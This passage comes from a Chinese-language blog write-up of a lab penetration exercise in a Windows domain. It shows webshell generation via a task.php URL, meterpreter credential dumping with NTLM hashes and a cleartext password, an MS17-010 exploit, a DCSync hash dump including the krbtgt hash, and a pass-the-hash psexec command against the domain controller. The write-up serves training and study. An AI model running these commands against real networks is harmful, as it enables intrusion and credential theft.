+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">input</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> type</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">submit</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;/</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">form</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202307282211795.png" alt="image-20230728221109740"></p>
+<p>拿到 id, 然后访问 <code>http://172.22.1.18/task.php?m=qcloudCos|runt&#x26;a=run&#x26;fileid=9</code> 生成 php, 最后蚁剑连接</p>
+<p><img src="https://img.exp10it.io/img/202307282124578.png" alt="image-20230728212459552"></p>
+<p>因为是 PHPStudy 搭建的网站, 权限很大, 直接就是 SYSTEM 权限</p>
+<p>在 Administrator 的家目录下拿到 flag02</p>
+<p><img src="https://img.exp10it.io/img/202307282121907.png" alt="image-20230728212120883"></p>
+<p><em>看网上 writeup 的时候发现也能通过 phpmyadmin 弱口令 + sql 写文件打进去</em></p>
+<h2 id="flag03">flag03</h2>
+<p>msf 反弹上线之前的机器, 方便打 ms17-010</p>
+<p><img src="https://img.exp10it.io/img/202307282107283.png" alt="image-20230728210708249"></p>
+<p><img src="https://img.exp10it.io/img/202307282126355.png" alt="image-20230728212649316"></p>
+<p>先收集 windows 机器上的凭据</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">meterpreter</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA"> ></span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> creds_all</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[+] Running as SYSTEM</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">] Retrieving all credentials</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">msv</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> credentials</span></span>
+<span class="line"><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">===============</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Username</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    NTLM</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">                              SHA1</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">--------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        ------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">    ----</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">                              ----</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Charles</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">         XIAORANG</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  f6a9881cd5ae709abb4ac9ab87f24617</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  99439e2268d0f5063928f523d5d44c8d69be7e34</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XIAORANG-OA01$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  e5a27a8f96f2a2e742b6cd69e87c739b</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  b870548b0c00dabf6262942068aeaa2e83440d97</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XIAORANG-OA01$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  dc5f050393a7cc83e0518b8015b8b65d</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  fc0612848c69ce0b4f2afc76e506289e4bc97bd8</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">wdigest</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> credentials</span></span>
+<span class="line"><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">===================</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Username</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    Password</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">--------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        ------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">    --------</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)          (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)    (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Charles</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">         XIAORANG</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  (null)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XIAORANG-OA01$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  (null)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">kerberos</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> credentials</span></span>
+<span class="line"><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">====================</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Username</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Password</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">--------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        ------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        --------</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)          (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)        (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Charles</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">         XIAORANG.LAB</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  Charlw0yFl8hx</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XIAORANG-OA01$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  xiaorang.lab</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ......</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (略)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XIAORANG-OA01$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  xiaorang.lab</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ......</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (略)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">xiaorang-oa01$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG.LAB</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ......</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (略)</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202307282128411.png" alt="image-20230728212812382"></p>
+<p><em>伪造 Charles 的身份执行啥命令都是拒绝访问, 之后 impacket psexec.py 连上去的时候才发现是密码过期了…</em></p>
+<p>打 ms17-010 (在 vps 上打好像有点问题? 所以换成了本机 + proxychains 的方式)</p>
+<p><img src="https://img.exp10it.io/img/202307282144590.png" alt=""></p>
+<p>收集凭据</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">meterpreter</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA"> ></span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> creds_all</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[+] Running as SYSTEM</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">] Retrieving all credentials</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">msv</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> credentials</span></span>
+<span class="line"><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">===============</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Username</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    NTLM</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">                              SHA1</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">--------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        ------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">    ----</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">                              ----</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XIAORANG-WIN7$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  474d95f0972b89f07c762044841ecb77</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  5c999df75d96227c3c5da11c228d394db182fe75</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">wdigest</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> credentials</span></span>
+<span class="line"><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">===================</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Username</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    Password</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">--------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        ------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">    --------</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)          (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)    (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XIAORANG-WIN7$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ......</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (略)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">kerberos</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> credentials</span></span>
+<span class="line"><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">====================</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">Username</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">        Password</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">--------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        ------</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">        --------</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)          (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)        (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">null</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">xiaorang-win7$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG.LAB</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  ......</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (略)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">xiaorang-win7$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  XIAORANG.LAB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  (null)</span></span></code></pre>
+<p>没啥可利用的信息, 不过这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash</p>
+<p>本来应该用 BloodHound 或者 PowerView 收集下信息的, 但是时间 (💰) 不够了 (</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">meterpreter</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA"> ></span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> kiwi_cmd</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> lsadump::dcsync</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /domain:xiaorang.lab</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /all</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> /csv</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[DC] </span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">xiaorang.lab</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> will be the domain</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[DC] </span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">DC01.xiaorang.lab</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> will be the DC server</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[DC] Exporting domain </span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">xiaorang.lab</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[rpc] Service  </span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">:</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> ldap</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[rpc] AuthnSvc </span><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">:</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> GSS_NEGOTIATE (</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">9</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">500</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     Administrator</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">   10cf89a850fb1cdbe6bb432b859164c8</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">        512</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">502</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">     krbtgt</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  fb812eea13a18b7fcdb8e6d67ddc205b</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">        514</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">1106</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    Marcus</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  e07510a4284b3c97c8e7dee970918c5c</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">        512</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">1107</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    Charles</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> f6a9881cd5ae709abb4ac9ab87f24617</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">        512</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">1000</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    DC01</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">$   </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">edc506302bf9b040febfb84a1459c0e8</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">        532480</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">1104</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    XIAORANG-OA01</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">$  </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">673ec2d0ad2f73341c4b3e1fc2fbade5</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">        4096</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">1103</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">    XIAORANG-WIN7</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">$  </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">507797b66f76b8b71d20555b0c59f86d</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">        4096</span></span></code></pre>
+<p>psexec pth</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">proxychains</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> psexec.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 172.22.1.2</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -hashes</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> :10cf89a850fb1cdbe6bb432b859164c8</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> XIAORANG.LAB/administrator@172.22.1.2</span></span></code></pre>
+<p>在 Administrator 的家目录下拿到 flag03</p>
+<p><img src="https://img.exp10it.io/img/202307282153581.png" alt="image-20230728215355537"></p> </article> <hr class="my-8 border-dashed"> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/pentest/chunqiuyunjing-initial-writeup.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> <ul class="mt-4 mb-8 sm:my-8"> <li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/windows/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-2"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>Windows</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/active-directory/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-3"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>Active Directory</span> </a> </li> </ul> <div id="btt-btn-container" class="fixed end-4 bottom-8 z-50 md:sticky md:end-auto md:float-end md:me-1 translate-y-14 opacity-0 transition duration-500"> <button data-button="back-to-top" class="group relative bg-background px-2 py-1 size-14 rounded-full shadow-xl md:h-8 md:w-fit md:rounded-md md:shadow-none md:focus-visible:rounded-none md:bg-background/35 md:bg-clip-padding md:backdrop-blur-lg"> <span id="progress-indicator" class="absolute inset-0 -z-10 block size-14 scale-110 rounded-full bg-transparent md:hidden md:h-8 md:rounded-md"></span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block rotate-90 md:hidden"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <span class="sr-only text-sm group-hover:text-accent md:not-sr-only"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 5l0 14" /><path d="M16 9l-4 -4" /><path d="M8 9l4 -4" /></svg>
+Back To Top
+</span> </button> </div> <script data-astro-rerun>
+  /** Scrolls the document to the top when
+   * the "Back to Top" button is clicked. */
+  function backToTop() {
+    const rootElement = document.documentElement;
+    const btnContainer = document.querySelector("#btt-btn-container");
+    const backToTopBtn = document.querySelector("[data-button='back-to-top']");
+    const progressIndicator = document.querySelector("#progress-indicator");
+
+    if (!rootElement || !btnContainer || !backToTopBtn || !progressIndicator)
+      return;
+
+    // Attach click event handler for back-to-top button
+    backToTopBtn.addEventListener("click", () => {
+      document.body.scrollTop = 0; // For Safari
